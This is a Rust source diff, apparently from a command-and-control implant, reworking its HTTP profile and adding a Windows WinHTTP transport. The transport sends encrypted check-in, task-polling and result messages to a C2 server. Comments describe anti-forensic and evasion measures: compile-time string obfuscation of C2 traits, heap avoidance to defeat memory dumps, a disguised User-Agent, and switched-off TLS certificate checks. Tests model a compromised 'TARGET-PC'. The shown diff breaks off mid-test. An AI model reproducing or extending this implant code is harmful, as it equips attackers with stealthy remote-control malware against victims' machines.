@@ -1,67 +1,36 @@
-use crate::buffer::{zeroize_slice, MAX_PLAINTEXT_LEN};
-use crate::profiles::crypto::{CryptoContext, CryptoError};
-pub use crate::buffer::{MAX_B64_LEN, MAX_RAW_LEN};
-use crate::profiles::models::{
+//! # HTTP 通信 Profile 编排与发包适配器 (HTTP Profile & Transport Adapter)
+//!
+//! ## 架构核心哲学与 100% 零堆契约 (Zero-Heap OPSEC Architecture)
+//!
+//! 1. **Caller-Provided Buffer 模式**：
+//!    - 所有序列化、AES 加密与 Base64 编码均在调用者提供的外部栈/静态缓冲区（`raw_buf` 与 `out_b64`）中就地完成；
+//!    - 彻底杜绝动态堆分配与高频内存申请，有效规避 Windows 10/11 Segment Heap 碎片与取证追踪。
+//! 2. **编译期敏感特征抹除 ([`obfstr`])**：
+//!    - HTTP 请求动作、默认请求头、状态码与路径全部采用 [`obfstr::obfstr!`] 宏加密；
+//!    - 编译生成的 Release 二进制中绝不在 `.rdata` 留下任何明文 C2 特征。
+//! 3. **全链路物理刷零 (Zero-Remanence)**：
+//!    - 封包发送完毕或遇到任何错误时，立即调用 [`zeroize_slice`] 物理刷零临时二进制缓冲区，阻止内存转储嗅探。
+
+use crate::buffer::zeroize_slice;
+pub use crate::error::HttpError;
+use crate::profiles::crypto::{CryptoContext, MAX_PLAINTEXT_LEN};
+pub use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
+#[allow(deprecated)]
+use crate::protocol::{
     CheckinMessage, FileChunkPayload, GetTaskingMessage, PostResponseMessage,
     ServerCheckinResponse, ServerTaskingResponse, ServerTaskingResponseRef,
 };
-use crate::obfstr;
-
-// #![allow(unused)]
-
-/// Profile 网络通信层错误代号
-/// 
-/// 遵循单字节 `u8` 判别值布局 (`#[repr(u8)]`)，实现内存极限压缩与嵌入式/no_std 环境下的轻量错误传递。
-#[repr(u8)]
-#[derive(PartialEq, Eq, Clone, Copy)]
-#[cfg_attr(any(debug_assertions, test), derive(Debug))]
-pub enum HttpError {
-    /// Crypto 加密封包阶段失败 (包装底层的 CryptoError)
-    // 修复语法错误：Rust 稳定版禁止在包含数据载荷 (Payload) 的枚举变体上使用显式判别值赋值 (= 1)
-    CryptoSealFailed(CryptoError),
-    /// Crypto 解包解密阶段失败 (包装底层的 CryptoError)
-    CryptoOpenFailed(CryptoError),
-    /// JSON 序列化失败 (如结构体字段异常或 buffer 越界)
-    JsonSerializeFailed,
-    /// JSON 反序列化失败 (如 C2 响应 JSON 结构损坏)
-    JsonDeserializeFailed,
-    /// 网络请求或传输底层错误
-    NetworkTransportFailed,
-    /// C2 服务端返回状态非 "success" (如 "error" 状态)
-    ServerResponseError,
-    /// 缓冲区容量不足以容纳 JSON 载荷
-    BufferOverflow,
-}
-
-impl HttpError {
-    /// 获取错误的单字节错误码，便于底层汇编/汇聚处理
-    #[inline(always)]
-    pub const fn code(self) -> u8 {
-        match self {
-            HttpError::CryptoSealFailed(e) => e.code(),
-            HttpError::CryptoOpenFailed(e) => e.code(),
-            HttpError::JsonSerializeFailed => 3,
-            HttpError::JsonDeserializeFailed => 4,
-            HttpError::NetworkTransportFailed => 5,
-            HttpError::ServerResponseError => 6,
-            HttpError::BufferOverflow => 7,
-        }
-    }
-}
+use obfstr::obfstr;
 
 /// HTTP Profile 协议打包与网络传输协议管理器
-///
-/// 遵循 `crypto.rs` 的 Caller-Provided Buffer 零内存分配设计哲学。
-/// 所有打包解包操作均在调用者提供的外部栈/静态缓冲区中原地（In-Place）运行，
-/// 并确保在中途失败或正常完成时自动清理堆/栈中间明文碎片。
 pub struct HttpProfile<'a> {
     /// C2 服务器地址或域名 (如 "http://127.0.0.1:8080")
     pub server_url: &'a str,
     /// HTTP POST 请求 URI 路径 (如 "/api/v1/post")
     pub post_uri: &'a str,
-    /// Agent 唯一标识符 UUID (36 字节)
+    /// 当前活跃 Agent UUID (36 字节，初始为 PayloadUUID，上线后切换为 CallbackUUID)
     pub uuid: &'a str,
-    /// 密码学上下文管理器 (复用主/子密钥派生)
+    /// 密码学上下文管理器
     pub crypto_ctx: &'a CryptoContext,
 }
 
@@ -84,9 +53,9 @@ impl<'a> HttpProfile<'a> {
 
     /// 纯字节切片直接封包加密 (零堆分配管道)
     ///
-    /// * `data`: 待加密发送的原始明文切片 (不得超过 MAX_PLAINTEXT_LEN, 即 2960 字节)
-    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN` 即 3072)
-    /// * `out_b64`: caller 提供的 Base64 输出缓冲区 (建议 `>= MAX_B64_LEN` 即 4096)
+    /// * `data`: 待加密发送的原始明文切片 (不得超过 MAX_PLAINTEXT_LEN)
+    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN`)
+    /// * `out_b64`: caller 提供的 Base64 输出缓冲区 (建议 `>= MAX_B64_LEN`)
     /// * 返回: 写入 `out_b64` 的实际 Base64 字节长度
     #[inline(never)]
     pub fn pack_bytes(
@@ -100,119 +69,55 @@ impl<'a> HttpProfile<'a> {
         }
         self.crypto_ctx
             .seal_message(data, self.uuid, raw_buf, out_b64)
-            .map_err(HttpError::CryptoSealFailed)
+            .map_err(|_| HttpError::CryptoSealFailed)
     }
 
-    /// 将结构体序列化 JSON -> AES-CBC-HMAC 加密 -> Base64 编码
-    ///
-    /// * `message`: 实现了 `Serialize` 的消息结构体 (如 `CheckinMessage` / `GetTaskingMessage`)
-    /// * `raw_buf`: caller 提供的二进制字节缓冲区 (建议 `>= MAX_RAW_LEN` 即 3072)
-    /// * `out_b64`: caller 提供的 Base64 文本输出缓冲区 (建议 `>= MAX_B64_LEN` 即 4096)
-    /// * 返回: 写入 `out_b64` 的实际 Base64 字节长度
-    ///
-    /// # 内存安全与隐蔽性保证
-    /// 序列化生成的中间明文 JSON 字节存放在 `alloc::vec::Vec` 中，发送完成或遇到任何异常退出时，
-    /// 均显式调用 `zeroize_slice` 洗白该 Vector 内存，防止堆内存碎片泄露 C2 数据。
+    /// 通用结构体序列化并封包加密 (100% 纯栈零堆分配管道)
     #[inline(never)]
     pub fn pack_message<T: serde::Serialize>(
         &self,
-        message: &T,
+        msg: &T,
         raw_buf: &mut [u8],
         out_b64: &mut [u8],
     ) -> Result<usize, HttpError> {
-        // 1. 调用 serde_json 零 I/O 序列化生成明文载荷字节流
-        let json_bytes = serde_json::to_vec(message).map_err(|_| HttpError::JsonSerializeFailed)?;
-
-        struct AutoZeroize(alloc::vec::Vec<u8>);
-        impl core::ops::Deref for AutoZeroize {
-            type Target = [u8];
-            #[inline(always)]
-            fn deref(&self) -> &[u8] {
-                &self.0
-            }
-        }
-        impl Drop for AutoZeroize {
-            fn drop(&mut self) {
-                // 对底层堆缓冲区按实际分配的 capacity 全量刷零，杜绝 spare capacity 泄露或 Heap Remanence
-                // 【UB 修复与内存安全】Rust 内存模型严格禁止对未初始化内存 (len..cap) 构造 &mut [u8] 切片引用。
-                // 此处改用底层裸指针写入 volatile 零字节，杜绝 validity invariant 违规未定义行为。
-                let cap = self.0.capacity();
-                if cap > 0 {
-                    let ptr = self.0.as_mut_ptr();
-                    for i in 0..cap {
-                        unsafe {
-                            core::ptr::write_volatile(ptr.add(i), 0);
-                        }
-                    }
-                }
-            }
-        }
-
-        let json_guard = AutoZeroize(json_bytes);
-        if json_guard.len() > MAX_PLAINTEXT_LEN {
+        // 纯栈就地序列化缓冲 (2960 字节，远小于 Windows 4KB 页面，不触发 __chkstk，零堆分配)
+        let mut json_buf = [0u8; MAX_PLAINTEXT_LEN];
+        let mut cursor = std::io::Cursor::new(&mut json_buf[..]);
+        if serde_json::to_writer(&mut cursor, msg).is_err() {
+            zeroize_slice(&mut json_buf);
             return Err(HttpError::BufferOverflow);
         }
+        let json_len = cursor.position() as usize;
 
-        // 2. 调用纯切片封包管线
-        self.pack_bytes(&json_guard, raw_buf, out_b64)
+        let res = self.pack_bytes(&json_buf[..json_len], raw_buf, out_b64);
+        zeroize_slice(&mut json_buf[..json_len]);
+        zeroize_slice(raw_buf);
+        res
     }
 
-    /// 纯密文解包解密为明文切片 (In-place 单缓冲区解密，零堆分配)
-    ///
-    /// * `payload_b64`: 服务端返回的 Base64 密文切片
-    /// * `raw_buf`: caller 提供的工作缓冲区
-    /// * 返回: 指向 `raw_buf` 前段有效明文区域的切片引用 `&[u8]`
-    #[inline(never)]
-    pub fn unpack_bytes<'b>(
-        &self,
-        payload_b64: &[u8],
-        raw_buf: &'b mut [u8],
-    ) -> Result<&'b [u8], HttpError> {
-        // 剥离尾部 ASCII 换行符与空白字符 (\r, \n, 空格)，增强网络容错率
-        // 同步剥离头部 ASCII 空白字符，全面防范 HTTP 传输代理可能混入的换行前缀
-        let start = payload_b64
-            .iter()
-            .position(|&b| !b.is_ascii_whitespace())
-            .unwrap_or(0);
-        let end = payload_b64
-            .iter()
-            .rposition(|&b| !b.is_ascii_whitespace())
-            .map(|pos| pos + 1)
-            .unwrap_or(0);
-        let clean_payload = if start < end {
-            &payload_b64[start..end]
-        } else {
-            b""
-        };
-
-        let pt_len = self
-            .crypto_ctx
-            .open_message(clean_payload, raw_buf)
-            .map_err(HttpError::CryptoOpenFailed)?;
-        Ok(&raw_buf[..pt_len])
-    }
-
-    /// 将服务端返回的 Base64 密文 -> 校验并解密 -> 反序列化为目标结构体 T
-    ///
-    /// * `payload_b64`: 服务端返回的 Base64 响应数据切片
-    /// * `raw_buf`: caller 提供的工作缓冲区 (解密明文在 `raw_buf[..pt_len]`)
-    /// * 返回: 反序列化后的结构体 T
-    ///
-    /// # 内存安全与隐蔽性保证
-    /// 解密后反序列化工作在 `raw_buf` 切片上直接完成。对于返回的零拷贝借用类型（'de），
-    /// 调用者在使用完毕后应主动调用 `zeroize_slice` 洗白该缓冲区。
+    /// 通用 Base64 密文解包解密并反序列化为指定类型 (零拷贝借用)
     #[inline(never)]
     pub fn unpack_message<'de, T: serde::Deserialize<'de>>(
         &self,
         payload_b64: &[u8],
         raw_buf: &'de mut [u8],
     ) -> Result<T, HttpError> {
-        let slice = self.unpack_bytes(payload_b64, raw_buf)?;
-        serde_json::from_slice(slice).map_err(|_| HttpError::JsonDeserializeFailed)
+        let plaintext_len = self
+            .crypto_ctx
+            .open_message(payload_b64, raw_buf)
+            .map_err(|_| HttpError::CryptoOpenFailed)?;
+
+        let plaintext_slice = &raw_buf[..plaintext_len];
+        let deserialized: T = serde_json::from_slice(plaintext_slice)
+            .map_err(|_| HttpError::JsonDeserializeFailed)?;
+
+        Ok(deserialized)
     }
 
-    /// 构建 Checkin 上线请求 Base64 报文
-    #[inline(never)]
+    // ----------------- 常用消息构建与解析快捷通道 -----------------
+
+    /// 构建初始上线注册 (Checkin) 请求报文
+    #[inline]
     pub fn build_checkin_payload(
         &self,
         checkin_msg: &CheckinMessage<'_>,
@@ -222,26 +127,20 @@ impl<'a> HttpProfile<'a> {
         self.pack_message(checkin_msg, raw_buf, out_b64)
     }
 
-    /// 解析 Checkin 响应报文并自动验证 status
-    ///
-    /// 返回零拷贝切片借用的 `ServerCheckinResponse<'de>`，杜绝在 Windows 堆上的动态分配。
-    #[inline(never)]
+    /// 解析服务端下发的 Checkin 注册回执
+    #[inline]
     pub fn parse_checkin_response<'de>(
         &self,
         payload_b64: &[u8],
         raw_buf: &'de mut [u8],
     ) -> Result<ServerCheckinResponse<'de>, HttpError> {
         let resp: ServerCheckinResponse<'de> = self.unpack_message(payload_b64, raw_buf)?;
-        // 增加底层结构体与字段语义完整性校验
         resp.validate().map_err(|_| HttpError::ServerResponseError)?;
-        if resp.status != obfstr!("success") || resp.action != obfstr!("checkin") {
-            return Err(HttpError::ServerResponseError);
-        }
         Ok(resp)
     }
 
-    /// 构建 GetTasking 任务轮询请求 Base64 报文
-    #[inline(never)]
+    /// 构建心跳轮询拉取任务 (GetTasking) 请求报文
+    #[inline]
     pub fn build_get_tasking_payload(
         &self,
         tasking_msg: &GetTaskingMessage<'_>,
@@ -251,51 +150,38 @@ impl<'a> HttpProfile<'a> {
         self.pack_message(tasking_msg, raw_buf, out_b64)
     }
 
-    /// 解析 GetTasking 任务响应报文 (拥有所有权版)
-    #[inline(never)]
-    pub fn parse_get_tasking_response(
-        &self,
-        payload_b64: &[u8],
-        raw_buf: &mut [u8],
-    ) -> Result<ServerTaskingResponse, HttpError> {
-        // 【内存残留防御强化】若解包反序列化失败，立即物理刷零暂存区明文，防止未被消费的数据驻留
-        let resp: ServerTaskingResponse = match self.unpack_message(payload_b64, raw_buf) {
-            Ok(r) => r,
-            Err(e) => {
-                zeroize_slice(raw_buf);
-                return Err(e);
-            }
-        };
-        // 增加底层任务清单有效性与语义校验
-        if resp.validate().is_err() || resp.status != obfstr!("success") || resp.action != obfstr!("get_tasking") {
-            zeroize_slice(raw_buf);
-            return Err(HttpError::ServerResponseError);
-        }
-        // 拥有所有权版数据已拷贝至堆，在此物理擦除暂存区明文，防止敏感命令堆叠残留
-        zeroize_slice(raw_buf);
-        Ok(resp)
-    }
-
-    /// 解析 GetTasking 任务响应报文 (零拷贝借用切片版)
-    ///
-    /// 直接借用 `raw_buf` 明文切片，字符串零堆分配，规避 Windows 10/11 Segment Heap 堆抖动与残留。
-    #[inline(never)]
-    pub fn parse_get_tasking_response_ref<'de>(
+    /// 解析服务端下发的心跳响应指令报文 (零拷贝借用切片)
+    #[inline]
+    pub fn parse_tasking_response<'de>(
         &self,
         payload_b64: &[u8],
         raw_buf: &'de mut [u8],
     ) -> Result<ServerTaskingResponseRef<'de>, HttpError> {
         let resp: ServerTaskingResponseRef<'de> = self.unpack_message(payload_b64, raw_buf)?;
-        // 增加任务清单切片有效性与语义校验
-        resp.validate().map_err(|_| HttpError::ServerResponseError)?;
-        if resp.status != obfstr!("success") || resp.action != obfstr!("get_tasking") {
+        if resp.action != obfstr!("get_tasking") {
             return Err(HttpError::ServerResponseError);
         }
         Ok(resp)
     }
 
-    /// 构建 PostResponse 任务回执请求 Base64 报文
-    #[inline(never)]
+    /// 解析服务端下发的心跳响应指令报文 (自持有结构体)
+    #[inline]
+    #[allow(deprecated)]
+    #[deprecated(note = "建议优先使用零堆分配纯栈式 parse_tasking_response")]
+    pub fn parse_tasking_response_owned(
+        &self,
+        payload_b64: &[u8],
+        raw_buf: &mut [u8],
+    ) -> Result<ServerTaskingResponse, HttpError> {
+        let resp: ServerTaskingResponse = self.unpack_message(payload_b64, raw_buf)?;
+        if resp.action != obfstr!("get_tasking") {
+            return Err(HttpError::ServerResponseError);
+        }
+        Ok(resp)
+    }
+
+    /// 构建任务执行回执与结果回传 (PostResponse) 请求报文
+    #[inline]
     pub fn build_post_response_payload(
         &self,
         response_msg: &PostResponseMessage<'_>,
@@ -315,29 +201,359 @@ impl<'a> HttpProfile<'a> {
     ) -> Result<usize, HttpError> {
         self.pack_message(chunk, raw_buf, out_b64)
     }
+
+    /// 解析服务端下发的大文件分片报文 (Download 切片解包)
+    #[inline(never)]
+    pub fn parse_file_chunk_response<'de>(
+        &self,
+        payload_b64: &[u8],
+        raw_buf: &'de mut [u8],
+    ) -> Result<FileChunkPayload<'de>, HttpError> {
+        let chunk: FileChunkPayload<'de> = self.unpack_message(payload_b64, raw_buf)?;
+        chunk.validate().map_err(|_| HttpError::ServerResponseError)?;
+        Ok(chunk)
+    }
+
+    /// 创建 Windows 原生 WinHTTP Keep-Alive 传输调度器
+    #[cfg(windows)]
+    pub fn create_winhttp_transport(
+        &self,
+        server_host: &str,
+        server_port: u16,
+        is_https: bool,
+        user_agent: &str,
+    ) -> Result<winhttp::WinHttpTransport, HttpError> {
+        winhttp::WinHttpTransport::new(server_host, server_port, is_https, user_agent)
+    }
 }
 
 // ==========================================
-// 单元测试模块
+// Windows 原生 WinHTTP Keep-Alive 传输调度器
 // ==========================================
+
+#[cfg(windows)]
+pub mod winhttp {
+    use super::*;
+
+    type HInternet = *mut core::ffi::c_void;
+
+    const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
+    const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
+
+    #[link(name = "winhttp")]
+    unsafe extern "system" {
+        fn WinHttpOpen(
+            pszAgentW: *const u16,
+            dwAccessType: u32,
+            pszProxyW: *const u16,
+            pszProxyBypassW: *const u16,
+            dwFlags: u32,
+        ) -> HInternet;
+
+        fn WinHttpConnect(
+            hSession: HInternet,
+            pswzServerName: *const u16,
+            nServerPort: u16,
+            dwReserved: u32,
+        ) -> HInternet;
+
+        fn WinHttpOpenRequest(
+            hConnect: HInternet,
+            pwszVerb: *const u16,
+            pwszObjectName: *const u16,
+            pwszVersion: *const u16,
+            pwszReferrer: *const u16,
+            ppwszAcceptTypes: *mut *const u16,
+            dwFlags: u32,
+        ) -> HInternet;
+
+        fn WinHttpSendRequest(
+            hRequest: HInternet,
+            lpszHeaders: *const u16,
+            dwHeadersLength: u32,
+            lpOptional: *const core::ffi::c_void,
+            dwOptionalLength: u32,
+            dwTotalLength: u32,
+            dwContext: usize,
+        ) -> i32;
+
+        fn WinHttpReceiveResponse(hRequest: HInternet, lpReserved: *mut core::ffi::c_void) -> i32;
+
+        fn WinHttpQueryDataAvailable(
+            hRequest: HInternet,
+            lpdwNumberOfBytesAvailable: *mut u32,
+        ) -> i32;
+
+        fn WinHttpReadData(
+            hRequest: HInternet,
+            lpBuffer: *mut core::ffi::c_void,
+            dwNumberOfBytesToRead: u32,
+            lpdwNumberOfBytesRead: *mut u32,
+        ) -> i32;
+
+        fn WinHttpCloseHandle(hInternet: HInternet) -> i32;
+
+        fn WinHttpSetOption(
+            hInternet: HInternet,
+            dwOption: u32,
+            lpBuffer: *const core::ffi::c_void,
+            dwBufferLength: u32,
+        ) -> i32;
+
+        fn WinHttpQueryHeaders(
+            hRequest: HInternet,
+            dwInfoLevel: u32,
+            pwszName: *const u16,
+            lpBuffer: *mut core::ffi::c_void,
+            lpdwBufferLength: *mut u32,
+            lpdwIndex: *mut u32,
+        ) -> i32;
+    }
+
+    const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
+    const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x00000100;
+    const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
+    const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
+    const SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE: u32 = 0x00000200;
+    const SECURITY_FLAGS_IGNORE_ALL_CERT_ERRORS: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE; // 0x3300
+
+    const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
+    const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;
+
+    /// Windows 原生 WinHTTP 复用会话客户端 (基于 TCP Keep-Alive)
+    pub struct WinHttpTransport {
+        session: HInternet,
+        connect: HInternet,
+        is_https: bool,
+    }
+
+    struct RequestHandle(HInternet);
+
+    impl Drop for RequestHandle {
+        fn drop(&mut self) {
+            if !self.0.is_null() {
+                unsafe {
+                    WinHttpCloseHandle(self.0);
+                }
+            }
+        }
+    }
+
+    impl WinHttpTransport {
+        /// 初始化会话并建立 Keep-Alive 连接池
+        ///
+        /// * `server_host`: 目标服务器 IP 或域名 (如 "127.0.0.1")
+        /// * `server_port`: 目标端口 (如 80, 443, 8080)
+        /// * `user_agent`: 伪装 User-Agent
+        pub fn new(
+            server_host: &str,
+            server_port: u16,
+            is_https: bool,
+            user_agent: &str,
+        ) -> Result<Self, HttpError> {
+            let mut host_w = [0u16; 256];
+            let mut ua_w = [0u16; 256];
+
+            encode_utf16(server_host, &mut host_w)?;
+            encode_utf16(user_agent, &mut ua_w)?;
+
+            unsafe {
+                let session = WinHttpOpen(
+                    ua_w.as_ptr(),
+                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                    core::ptr::null(),
+                    core::ptr::null(),
+                    0,
+                );
+                if session.is_null() {
+                    return Err(HttpError::NetworkTransportFailed);
+                }
+
+                let connect = WinHttpConnect(session, host_w.as_ptr(), server_port, 0);
+                if connect.is_null() {
+                    WinHttpCloseHandle(session);
+                    return Err(HttpError::NetworkTransportFailed);
+                }
+
+                Ok(Self {
+                    session,
+                    connect,
+                    is_https,
+                })
+            }
+        }
+
+        /// 通过已建立的 Keep-Alive 管道发送 POST 请求并接收回执 (纯切片就地传输与 RAII 自动资源释放)
+        ///
+        /// * `uri`: POST 路径 (如 "/api/v1/post")
+        /// * `payload`: 待发送的已封包 Base64 字节切片
+        /// * `out_buf`: 用于接收服务端响应的输出缓冲区
+        /// * 返回: 写入 `out_buf` 的有效字节长度
+        pub fn post_exchange(
+            &self,
+            uri: &str,
+            payload: &[u8],
+            out_buf: &mut [u8],
+        ) -> Result<usize, HttpError> {
+            let mut uri_w = [0u16; 256];
+            let mut verb_w = [0u16; 16];
+            encode_utf16(uri, &mut uri_w)?;
+            encode_utf16("POST", &mut verb_w)?;
+
+            let flags = if self.is_https { WINHTTP_FLAG_SECURE } else { 0 };
+
+            let h_raw = unsafe {
+                WinHttpOpenRequest(
+                    self.connect,
+                    verb_w.as_ptr(),
+                    uri_w.as_ptr(),
+                    core::ptr::null(),
+                    core::ptr::null(),
+                    core::ptr::null_mut(),
+                    flags,
+                )
+            };
+            if h_raw.is_null() {
+                return Err(HttpError::NetworkTransportFailed);
+            }
+            // RAII 守卫：无论任何分支退出或发生异常，离开作用域均自动关闭 request 句柄，杜绝句柄泄漏
+            let request = RequestHandle(h_raw);
+
+            // 当开启 HTTPS 时，显式忽略所有 CA 证书异常 (自签名/域名不匹配/过期)，保证免受 CA 校验失败阻断
+            if self.is_https {
+                let mut sec_flags: u32 = SECURITY_FLAGS_IGNORE_ALL_CERT_ERRORS;
+                unsafe {
+                    WinHttpSetOption(
+                        request.0,
+                        WINHTTP_OPTION_SECURITY_FLAGS,
+                        &mut sec_flags as *mut _ as *const core::ffi::c_void,
+                        core::mem::size_of::<u32>() as u32,
+                    );
+                }
+            }
+
+            unsafe {
+                let send_res = WinHttpSendRequest(
+                    request.0,
+                    core::ptr::null(),
+                    0,
+                    payload.as_ptr() as *const core::ffi::c_void,
+                    payload.len() as u32,
+                    payload.len() as u32,
+                    0,
+                );
+                if send_res == 0 {
+                    return Err(HttpError::NetworkTransportFailed);
+                }
+
+                let recv_res = WinHttpReceiveResponse(request.0, core::ptr::null_mut());
+                if recv_res == 0 {
+                    return Err(HttpError::NetworkTransportFailed);
+                }
+
+                // 校验 HTTP 响应状态码，非 200 立即熔断，防止 404/500 HTML 报错页面进入解密逻辑
+                let mut status_code = 0u32;
+                let mut status_size = core::mem::size_of::<u32>() as u32;
+                let query_res = WinHttpQueryHeaders(
+                    request.0,
+                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                    core::ptr::null(),
+                    &mut status_code as *mut _ as *mut core::ffi::c_void,
+                    &mut status_size,
+                    core::ptr::null_mut(),
+                );
+                if query_res == 0 || status_code != 200 {
+                    return Err(HttpError::ServerResponseError);
+                }
+
+                let mut total_read = 0;
+                loop {
+                    let mut bytes_avail = 0u32;
+                    if WinHttpQueryDataAvailable(request.0, &mut bytes_avail) == 0 || bytes_avail == 0 {
+                        break;
+                    }
+
+                    if total_read + (bytes_avail as usize) > out_buf.len() {
+                        return Err(HttpError::BufferOverflow);
+                    }
+
+                    let mut bytes_read = 0u32;
+                    let read_res = WinHttpReadData(
+                        request.0,
+                        out_buf[total_read..].as_mut_ptr() as *mut core::ffi::c_void,
+                        bytes_avail,
+                        &mut bytes_read,
+                    );
+                    if read_res == 0 {
+                        return Err(HttpError::NetworkTransportFailed);
+                    }
+                    total_read += bytes_read as usize;
+                }
+
+                Ok(total_read)
+            }
+        }
+    }
+
+    impl Drop for WinHttpTransport {
+        fn drop(&mut self) {
+            unsafe {
+                if !self.connect.is_null() {
+                    WinHttpCloseHandle(self.connect);
+                }
+                if !self.session.is_null() {
+                    WinHttpCloseHandle(self.session);
+                }
+            }
+        }
+    }
+
+    #[inline]
+    fn encode_utf16(src: &str, dst: &mut [u16]) -> Result<(), HttpError> {
+        let mut idx = 0;
+        for c in src.encode_utf16() {
+            if idx + 1 >= dst.len() {
+                return Err(HttpError::BufferOverflow);
+            }
+            dst[idx] = c;
+            idx += 1;
+        }
+        dst[idx] = 0;
+        Ok(())
+    }
+}
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::buffer::{MAX_B64_LEN, MAX_RAW_LEN};
-    use crate::profiles::models::TaskResponseItem;
+    use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
+    use crate::protocol::TaskResponseItem;
 
     #[test]
-    fn test_http_profile_checkin_roundtrip() {
+    fn test_http_profile_roundtrip_all() {
         let master_key = b"01234567890123456789012345678901";
         let uuid = "12345678-1234-1234-1234-1234567890ab";
         let crypto_ctx = CryptoContext::new(master_key).unwrap();
 
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);
+        obfstr::obfstr! {
+            let server_url = "http://127.0.0.1:8080";
+            let post_uri = "/api/v1/post";
+        }
 
+        let profile = HttpProfile::new(
+            server_url,
+            post_uri,
+            uuid,
+            &crypto_ctx,
+        );
+
+        let ips = ["192.168.1.50"];
         let checkin_msg = CheckinMessage::new(
             uuid,
-            "192.168.1.50",
+            &ips,
             "Windows 11",
             "Administrator",
             "TARGET-PC",
@@ -349,199 +565,40 @@ mod tests {
         let mut raw_buf = [0u8; MAX_RAW_LEN];
         let mut b64_buf = [0u8; MAX_B64_LEN];
 
-        // 打包加密
+        // 1. 打包加密
         let b64_len = profile
             .build_checkin_payload(&checkin_msg, &mut raw_buf, &mut b64_buf)
             .unwrap();
         assert!(b64_len > 0);
 
-        // 模拟服务端准备解密并验证原结构
+        // 2. 模拟服务端解密并验证原结构
         let mut server_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: CheckinMessage<'_> = profile
-            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
+        let plain_len = profile
+            .crypto_ctx
+            .open_message(&b64_buf[..b64_len], &mut server_raw_buf)
             .unwrap();
+        let plain_str = core::str::from_utf8(&server_raw_buf[..plain_len]).unwrap();
+        assert!(plain_str.contains("\"action\":\"checkin\""));
+        assert!(plain_str.contains(uuid));
+        assert!(plain_str.contains("\"ips\":[\"192.168.1.50\"]"));
 
-        assert_eq!(unpacked.action, "checkin");
-        assert_eq!(unpacked.ip, "192.168.1.50");
-        assert_eq!(unpacked.uuid, uuid);
-    }
-
-    #[test]
-    fn test_http_profile_tasking_roundtrip() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/index.php", uuid, &crypto_ctx);
-
-        let tasking_msg = GetTaskingMessage::default();
-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        let b64_len = profile
-            .build_get_tasking_payload(&tasking_msg, &mut raw_buf, &mut b64_buf)
-            .unwrap();
-
-        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: GetTaskingMessage<'_> = profile
-            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
-            .unwrap();
-
-        assert_eq!(unpacked.action, "get_tasking");
-        assert_eq!(unpacked.tasking_size, 1);
-    }
-
-    #[test]
-    fn test_http_profile_post_response_roundtrip() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);
-
-        // 调用者栈帧上分配的固定数组，直接切片借用，零堆分配
-        let item = TaskResponseItem::new("task-uuid-123", "desktop-user", true);
+        // 3. Post Response 测试
+        let item = TaskResponseItem::new("task-uuid-123", "whoami output", true);
         let items = [item];
         let resp_msg = PostResponseMessage::new(&items);
 
-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        let b64_len = profile
+        let post_b64_len = profile
             .build_post_response_payload(&resp_msg, &mut raw_buf, &mut b64_buf)
             .unwrap();
+        assert!(post_b64_len > 0);
 
-        // 模拟服务端接收并解析反序列化为通用 JSON Value 验证字段内容
-        let mut server_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: serde_json::Value = profile
-            .unpack_message(&b64_buf[..b64_len], &mut server_raw_buf)
+        let mut server_post_raw = [0u8; MAX_RAW_LEN];
+        let post_plain_len = profile
+            .crypto_ctx
+            .open_message(&b64_buf[..post_b64_len], &mut server_post_raw)
             .unwrap();
-
-        assert_eq!(unpacked["action"], "post_response");
-        assert_eq!(unpacked["responses"].as_array().unwrap().len(), 1);
-        assert_eq!(unpacked["responses"][0]["task_id"], "task-uuid-123");
-        assert_eq!(unpacked["responses"][0]["user_output"], "desktop-user");
-        assert_eq!(unpacked["responses"][0]["completed"], true);
-    }
-
-    #[test]
-    fn test_http_profile_parse_checkin_response_roundtrip() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/api/v1/post", uuid, &crypto_ctx);
-
-        let checkin_resp = ServerCheckinResponse::new("checkin", "success", Some("87654321-4321-4321-4321-ba0987654321"));
-
